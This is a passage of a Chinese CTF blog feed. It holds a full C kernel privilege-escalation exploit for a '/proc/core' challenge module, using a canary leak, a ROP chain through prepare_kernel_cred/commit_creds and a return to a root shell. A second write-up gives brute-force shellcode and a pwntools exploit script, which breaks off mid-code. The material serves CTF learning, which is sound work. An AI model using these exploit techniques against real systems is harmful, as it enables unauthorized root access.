class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trap_frame</span>&#123;</span>c</span><br><span class="line">    <span class="type">void</span> *rip;</span><br><span class="line">    <span class="type">uint64_t</span> cs;</span><br><span class="line">    <span class="type">uint64_t</span> rflags;</span><br><span class="line">    <span class="type">void</span> * rsp;</span><br><span class="line">    <span class="type">uint64_t</span> ss;</span><br><span class="line">&#125;__attribute__((packed));</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trap_frame</span> <span class="title">tf</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> kernel_base=<span class="number">0</span>;</span><br><span class="line"><span class="type">uint64_t</span> commit_creds=<span class="number">0</span>;</span><br><span class="line"><span class="type">uint64_t</span> prepare_kernel_cred = <span class="number">0</span>;</span><br><span class="line"><span class="type">uint64_t</span> commit_creds_offset = <span class="number">0x9c8e0</span>;</span><br><span class="line"><span class="type">uint64_t</span> prepare_kernel_cred_offset = <span class="number">0x9cce0</span>;</span><br><span class="line"><span class="type">uint64_t</span> canary = <span class="number">0</span>;</span><br><span class="line"><span class="type">uint64_t</span> rbp = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> prdi_ret = <span class="number">0x0b2f</span>; <span class="comment">//: pop rdi; ret;</span></span><br><span class="line"><span class="type">uint64_t</span> mov_rdi_rax_jmp_rcx = <span class="number">0x1ae978</span>; <span class="comment">//: mov rdi, rax; jmp rcx;</span></span><br><span class="line"><span class="type">uint64_t</span> mov_rdi_rax_jmp_rdx = <span class="number">0x6a6d2</span>; <span class="comment">//: mov rdi, rax; jmp rdx;</span></span><br><span class="line"><span class="type">uint64_t</span> prcx_ret = <span class="number">0x21e53</span>; <span class="comment">//: pop rcx; ret;</span></span><br><span class="line"><span class="type">uint64_t</span> swapgs_p_ret = <span class="number">0xa012da</span>; <span class="comment">//: swapgs; popfq; ret;</span></span><br><span class="line"><span class="type">uint64_t</span> iretq_ret = <span class="number">0x50ac2</span>; <span class="comment">//: iretq; ret;</span></span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">get_kernel_base</span><span class="params">()</span>&#123;</span><br><span class="line">    FILE *fd;</span><br><span class="line">    <span class="type">uint64_t</span> kernel_base1=<span class="number">0</span>,kernel_base2=<span class="number">0</span>;</span><br><span class="line">    fd=fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>,<span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    <span class="type">char</span> line[<span class="number">0x30</span>];</span><br><span class="line">    <span class="keyword">if</span>(fd&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        die(<span class="string">&quot;open kallsyms fialed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        fgets(line,<span class="number">0x30</span>,fd);</span><br><span class="line">        <span class="keyword">if</span>(kernel_base!=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(line,<span class="string">&quot;commit_creds&quot;</span>)&amp;&amp;!commit_creds)&#123;</span><br><span class="line">            getchar();</span><br><span class="line">            <span class="built_in">sscanf</span>(line,<span class="string">&quot;%llx&quot;</span>,&amp;commit_creds);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;commit_creds addr: %p\n&quot;</span>,commit_creds);</span><br><span class="line">            kernel_base1=commit_creds-commit_creds_offset;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(line,<span class="string">&quot;prepare_kernel_cred&quot;</span>)&amp;&amp;!prepare_kernel_cred)&#123;</span><br><span class="line">            getchar();</span><br><span class="line">            <span class="built_in">sscanf</span>(line,<span class="string">&quot;%llx&quot;</span>,&amp;prepare_kernel_cred);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;prepare_kernel_cred addr: %p\n&quot;</span>,prepare_kernel_cred);</span><br><span class="line">            kernel_base2=prepare_kernel_cred-prepare_kernel_cred_offset;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(kernel_base1!=<span class="number">0</span>&amp;&amp;kernel_base1==kernel_base2)&#123;</span><br><span class="line">            kernel_base=kernel_base1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">leak</span><span class="params">(<span class="type">int</span> fd)</span>&#123;</span><br><span class="line">    ioctl(fd,<span class="number">0x6677889C</span>,<span class="number">0x40</span>);</span><br><span class="line">    <span class="type">uint8_t</span> buffer[<span class="number">0x40</span>];</span><br><span class="line">    ioctl(fd,<span class="number">0x6677889B</span>,buffer);</span><br><span class="line">    canary=*(<span class="type">uint64_t</span> *)buffer;</span><br><span class="line">    rbp=*(<span class="type">uint64_t</span> *)(buffer+<span class="number">8</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;canary: %p\n&quot;</span>,canary);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">set_gadget_addr</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    prdi_ret += kernel_base;</span><br><span class="line">    prcx_ret += kernel_base;</span><br><span class="line">    mov_rdi_rax_jmp_rcx += kernel_base;</span><br><span class="line">    mov_rdi_rax_jmp_rdx += kernel_base;</span><br><span class="line">    swapgs_p_ret += kernel_base;</span><br><span class="line">    iretq_ret += kernel_base;</span><br><span class="line">    <span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">launch_shell</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span>&#123;</span><br><span class="line">     <span class="keyword">asm</span>(</span><br><span class="line">       <span class="string">&quot; mov %%cs, %0\n&quot;</span></span><br><span class="line">       <span class="string">&quot;mov %%ss,%1\n&quot;</span></span><br><span class="line">       <span class="string">&quot;mov %%rsp,%3\n&quot;</span></span><br><span class="line">       <span class="string">&quot;pushfq\n&quot;</span></span><br><span class="line">       <span class="string">&quot;popq %2&quot;</span></span><br><span class="line">       :<span class="string">&quot;=r&quot;</span>(tf.cs),<span class="string">&quot;=r&quot;</span>(tf.ss),<span class="string">&quot;=r&quot;</span>(tf.rflags),<span class="string">&quot;=r&quot;</span>(tf.rsp)</span><br><span class="line">       :</span><br><span class="line">       :<span class="string">&quot;memory&quot;</span></span><br><span class="line">    );</span><br><span class="line">    tf.rsp -= <span class="number">4096</span>;</span><br><span class="line">    tf.rip = &amp;launch_shell;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">launch_shell</span><span class="params">()</span>&#123;</span><br><span class="line">    execl(<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;sh&quot;</span>,<span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">bool</span> ret = get_kernel_base();</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="type">uint8_t</span> buffer[<span class="number">0x800</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;/proc/core&quot;</span>,O_RDWR);</span><br><span class="line">    leak(fd);</span><br><span class="line">    set_gadget_addr();</span><br><span class="line">    save_status();</span><br><span class="line">    <span class="type">uint64_t</span> *ptr;</span><br><span class="line">    ptr = (<span class="type">uint64_t</span> *)(buffer+<span class="number">0x40</span>);</span><br><span class="line">    *(ptr + i++) = canary;</span><br><span class="line">    *(ptr + i++) = rbp;</span><br><span class="line">    *(ptr + i++) = prdi_ret;</span><br><span class="line">    *(ptr + i++) = <span class="number">0</span>;</span><br><span class="line">    *(ptr + i++) = prepare_kernel_cred;</span><br><span class="line">    *(ptr + i++) = prcx_ret;</span><br><span class="line">    *(ptr + i++) = commit_creds;</span><br><span class="line">    *(ptr + i++) = mov_rdi_rax_jmp_rcx;</span><br><span class="line"></span><br><span class="line">    *(ptr + i++) = swapgs_p_ret;</span><br><span class="line">    *(ptr + i++) = <span class="number">0</span>;</span><br><span class="line">    *(ptr + i++) = iretq_ret;</span><br><span class="line">    *(ptr + i++) = (<span class="type">uint64_t</span>) launch_shell;</span><br><span class="line">    *(ptr + i++) = tf.cs;</span><br><span class="line">    *(ptr + i++) = tf.rflags;</span><br><span class="line">    *(ptr + i++) = tf.rsp;</span><br><span class="line">    *(ptr + i++) = tf.ss;</span><br><span class="line"></span><br><span class="line">    write(fd,buffer,<span class="number">0x800</span>);</span><br><span class="line">    <span class="type">uint64_t</span> len=<span class="number">0xffffffff00000000</span>;</span><br><span class="line">    <span class="type">uint32_t</span> l=<span class="number">0x100</span>;</span><br><span class="line">    len|=l;</span><br><span class="line">    ioctl(fd,<span class="number">0x6677889A</span>,len);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一点补充：<br>静态编译exp(内核没有c库):<br><code>gcc exp.c -static -o exploit</code></p><p>查找gadget指令：<br><code>ROPgadget --binary vmlinux &gt; ropgadget</code></p><p>调试方法：<br>.sh脚本里有-s我们可以通过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gdb ./vmlinux</span><br><span class="line">target remote:1234</span><br><span class="line">add-symbol-file core.ko 0xffffffffc0000000  (该text的基地址通过cat /sys/module/core/sections/.text得到)</span><br></pre></td></tr></table></figure><p>这样就可以直接根据模块里的函数名下断了。</p><p>但又一点很疑惑的时pwngdb调内核空间巨卡，而且si&#x2F;ni直接跑飞了🤦，只能下断点再c这样调，ruan师傅说gef调起来很快，得再去搞个gef来。</p><p>参考博客（感谢）：<br><a href="https://f5.pm/go-26809.html">https://f5.pm/go-26809.html</a><br><a href="https://www.cnblogs.com/T1e9u/p/13805760.html">https://www.cnblogs.com/T1e9u/p/13805760.html</a><br><a href="https://www.freebuf.com/articles/system/227357.html">https://www.freebuf.com/articles/system/227357.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> KERNEL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Xnuca2020线上赛l</title>
      <link href="/2020/11/04/Xnuca2020%E7%BA%BF%E4%B8%8A%E8%B5%9B/"/>
      <url>/2020/11/04/Xnuca2020%E7%BA%BF%E4%B8%8A%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h3 id="Xnuca2020线上赛"><a href="#Xnuca2020线上赛" class="headerlink" title="Xnuca2020线上赛"></a>Xnuca2020线上赛</h3><blockquote><p>比赛时pwn题都是ruan解的tttttql😍，我TM直接化身ruan师傅迷弟。不亏是中科院，收获满满。</p></blockquote><span id="more"></span><h4 id="defile"><a href="#defile" class="headerlink" title="defile"></a>defile</h4><p>这题在听了ruan师傅讲解之后才终于搞明白了🙆‍♂️<br>题目给出了源码，编译好的elf文件，makefile，查看makefile发现<code>gcc defile.c -o defile -lseccomp -g</code>，开了seccomp以及给出了调试符号，意味着我们可以源码调试了。</p><p>接下来就是阅读源代码了，逻辑大概是这样的（如有错误请务必指正）：<br>程序首先mmap一块较大(4096)的shared空间，接下来fork出子进程。该子进程的任务是首先让我们向shared输入4094大小的内容，之后循环(while(1))的fork出孙子进程(相对于父进程而言)，fork出的孙子进程会执行我们的输入也即shellcode，执行完后就exit(0)，之后子进程在继续fork，循环上述的执行。</p><p>这里要注意的一点是再孙子进程跳去执行shellcode的时候:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">uint64_t</span> targetaddr = (<span class="type">uint64_t</span>)shared + (i % <span class="number">2</span>) * ((<span class="number">4096</span> - <span class="number">2</span>) / <span class="number">2</span>);</span><br><span class="line">                __asm__(</span><br><span class="line">                    <span class="string">&quot;mov $0xdeadbeefdeadbeef, %%rax\n\t&quot;</span></span><br><span class="line">                    <span class="string">&quot;mov $0xdeadbeefdeadbeef, %%rbx\n\t&quot;</span></span><br><span class="line">                    <span class="string">&quot;mov $0xdeadbeefdeadbeef, %%rcx\n\t&quot;</span></span><br><span class="line">                    <span class="string">&quot;mov $0xdeadbeefdeadbeef, %%rdi\n\t&quot;</span></span><br><span class="line">                    <span class="string">&quot;mov $0xdeadbeefdeadbeef, %%rsi\n\t&quot;</span></span><br><span class="line">                    <span class="string">&quot;mov $0xdeadbeefdeadbeef, %%r8\n\t&quot;</span></span><br><span class="line">                    <span class="string">&quot;mov $0xdeadbeefdeadbeef, %%r9\n\t&quot;</span></span><br><span class="line">                    <span class="string">&quot;mov $0xdeadbeefdeadbeef, %%r10\n\t&quot;</span></span><br><span class="line">                    <span class="string">&quot;mov $0xdeadbeefdeadbeef, %%r11\n\t&quot;</span></span><br><span class="line">                    <span class="string">&quot;mov $0xdeadbeefdeadbeef, %%r12\n\t&quot;</span></span><br><span class="line">                    <span class="string">&quot;mov $0xdeadbeefdeadbeef, %%r13\n\t&quot;</span></span><br><span class="line">                    <span class="string">&quot;mov $0xdeadbeefdeadbeef, %%r14\n\t&quot;</span></span><br><span class="line">                    <span class="string">&quot;mov $0xdeadbeefdeadbeef, %%r15\n\t&quot;</span></span><br><span class="line">                    <span class="string">&quot;jmp *%%rdx\n\t&quot;</span></span><br><span class="line">                    :</span><br><span class="line">                    :<span class="string">&quot;d&quot;</span>(targetaddr)</span><br><span class="line">                    :</span><br><span class="line">                );</span><br></pre></td></tr></table></figure><p>可见是有两个入口地址的一个是shared，另一个是shared+2046，也即4096的空间里应该有我们两部分相同的shellcode。</p><p>父进程所作的就是通过random生成一段128长度的随机数，并且进行128轮次的循环。每一轮所做的就是比较shared+4095和key[i]的大小，如果相等就往shared+offset(也是随机数)写入0xcccccccccccccccc来破坏我们的shellcode，然后再比较shared+0x4094是否为1，相等则才进行下一轮的比较。执行完128轮之后程序会从pipe里读出128的内容于key比较，相同就给我们flag了。</p><p>这样看下来我们的shellcode所要完成的功能为：</p><p>1.shared+4095&#x3D;&#x3D;key[i]，需要循环爆破。</p><p>2.shared+4095&#x3D;&#x3D;1</p><p>3.write(pipe,&amp;key[i],1)。</p><p>由于0xcccccccccccccccc的写入我们可以有这样的思路：<br>首先从0开始循环增加的向shared+4095写入，每次写入之后都对shellcode进行检查，如果没有0xcccccccccccccccc的出现说明还没爆破到，若有0xcccccccccccccccc说明爆破到了key，之后由于我们再该空间内有两端相同的shellcode，因此可以通过偏移的相对位置利用未被写入0xcccccccccccccccc的那段来修复写入0xcccccccccccccccc的那段shellcode，之后构造write(pipe,&amp;key[i],1)向管道写入Key值，之后exit()。</p><p>对应的汇编如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">code = &quot;&quot;&quot;</span><br><span class="line">and rdx,0xfffffffffffff000</span><br><span class="line">add rdx,0xe</span><br><span class="line">jmp rdx</span><br><span class="line">xor rbx,rbx</span><br><span class="line">xor rax,rax</span><br><span class="line">and rdx,0xfffffffffffff000</span><br><span class="line">mov byte ptr [rdx+0xfff],bl</span><br><span class="line">loop_:</span><br><span class="line">call check</span><br><span class="line">mfence</span><br><span class="line">call check</span><br><span class="line">cmpw cx,0x200</span><br><span class="line">jne find</span><br><span class="line">inc bl</span><br><span class="line">mov byte ptr [rdx+0xfff],bl</span><br><span class="line">cmpb bl,0</span><br><span class="line">jne loop_</span><br><span class="line">find:</span><br><span class="line">mov ax,cx</span><br><span class="line">cmpw cx,0x100</span><br><span class="line">jle l1</span><br><span class="line">sub ax,0x100</span><br><span class="line">jmp l2</span><br><span class="line">l1:</span><br><span class="line">add ax,0x100</span><br><span class="line">l2:</span><br><span class="line">mov r11,[rdx+rax*8]</span><br><span class="line">mov qword ptr [rdx+rcx*8],r11</span><br><span class="line">push rbx</span><br><span class="line">mov rsi,rsp</span><br><span class="line">mov edi,4</span><br><span class="line">mov r12,rdx</span><br><span class="line"></span><br><span class="line">xor rdx,rdx</span><br><span class="line">inc rdx</span><br><span class="line">mov rax,rdx</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">mov byte ptr [r12+0xffe],1</span><br><span class="line"></span><br><span class="line">xor rdi,rdi</span><br><span class="line">mov rax,0xe7</span><br><span class="line">syscall</span><br><span class="line">check:</span><br><span class="line">xor rcx,rcx</span><br><span class="line">find_cc:</span><br><span class="line">movabsqr11,-3689348814741910324</span><br><span class="line">cmpq qword ptr [rdx + rcx*8],r11</span><br><span class="line">je find_</span><br><span class="line">inc rcx</span><br><span class="line">cmpw cx,0x200</span><br><span class="line">jne find_cc</span><br><span class="line">ret</span><br><span class="line">find_:</span><br><span class="line">ret</span><br><span class="line">&quot;&quot;&quot;</span><br></pre></td></tr></table></figure><p>开始的时候我们只call check了一次，这样会出现一个问题就是当我们爆破到了key但call check时，父进程还没完成0xcccccccccccccccc的写入导致call check返回0，使得写入的shared+4095会比key大1，为了解决父子进程这种可能的速度差异，我们选择使用了两次call check。</p><p>完整exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">addr,PIE=<span class="literal">True</span></span>):</span><br><span class="line"><span class="keyword">if</span> PIE:</span><br><span class="line">text_base = <span class="built_in">int</span>(os.popen(<span class="string">&quot;pmap &#123;&#125;| awk &#x27;&#123;&#123;print $1&#125;&#125;&#x27;&quot;</span>.<span class="built_in">format</span>(p.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">gdb.attach(p,<span class="string">&#x27;b *&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(text_base+addr)))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">gdb.attach(p,<span class="string">&quot;b *&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(addr)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">host,port=<span class="number">40001</span></span>):</span><br><span class="line">    <span class="keyword">global</span> p</span><br><span class="line">    <span class="keyword">if</span> host:</span><br><span class="line">        p=remote(host,port)</span><br><span class="line">        p.recvuntil(<span class="string">&quot;INPUT YOUR TOKEN:&quot;</span>)</span><br><span class="line">        p.send(<span class="string">&quot;icq95bbff617706a68d47723be2f12b7&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p=process(<span class="string">&quot;./defile&quot;</span>)</span><br><span class="line">        <span class="comment"># debug(0x1A4F)</span></span><br><span class="line">        <span class="comment"># pause()</span></span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    <span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">    shellcode=code = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    and rdx,0xfffffffffffff000</span></span><br><span class="line"><span class="string">    add rdx,0xe</span></span><br><span class="line"><span class="string">    jmp rdx</span></span><br><span class="line"><span class="string">    xor rbx,rbx</span></span><br><span class="line"><span class="string">    xor rax,rax</span></span><br><span class="line"><span class="string">    and rdx,0xfffffffffffff000</span></span><br><span class="line"><span class="string">    mfence</span></span><br><span class="line"><span class="string">    mov byte ptr [rdx+0xfff],bl</span></span><br><span class="line"><span class="string">    mfence</span></span><br><span class="line"><span class="string">    mfence</span></span><br><span class="line"><span class="string">    loop_:</span></span><br><span class="line"><span class="string">        call check</span></span><br><span class="line"><span class="string">        mfence</span></span><br><span class="line"><span class="string">    call check</span></span><br><span class="line"><span class="string">    cmpw cx,0x200</span></span><br><span class="line"><span class="string">    jne find</span></span><br><span class="line"><span class="string">    inc bl</span></span><br><span class="line"><span class="string">    mfence</span></span><br><span class="line"><span class="string">    mov byte ptr [rdx+0xfff],bl</span></span><br><span class="line"><span class="string">    mfence</span></span><br><span class="line"><span class="string">    cmpb bl,0</span></span><br><span class="line"><span class="string">    jne loop_</span></span><br><span class="line"><span class="string">    find:</span></span><br><span class="line"><span class="string">    mov ax,cx</span></span><br><span class="line"><span class="string">    cmpw cx,0x100</span></span><br><span class="line"><span class="string">    jle l1</span></span><br><span class="line"><span class="string">    sub ax,0x100</span></span><br><span class="line"><span class="string">    jmp l2</span></span><br><span class="line"><span class="string">    l1:</span></span><br><span class="line"><span class="string">    add ax,0x100</span></span><br><span class="line"><span class="string">    l2:</span></span><br><span class="line"><span class="string">    mov r11,[rdx+rax*8]</span></span><br><span class="line"><span class="string">    mov qword ptr [rdx+rcx*8],r11</span></span><br><span class="line"><span class="string">    push rbx</span></span><br><span class="line"><span class="string">    mov rsi,rsp</span></span><br><span class="line"><span class="string">    mov edi,4</span></span><br><span class="line"><span class="string">    mov r12,rdx</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    xor rdx,rdx</span></span><br><span class="line"><span class="string">    inc rdx</span></span><br><span 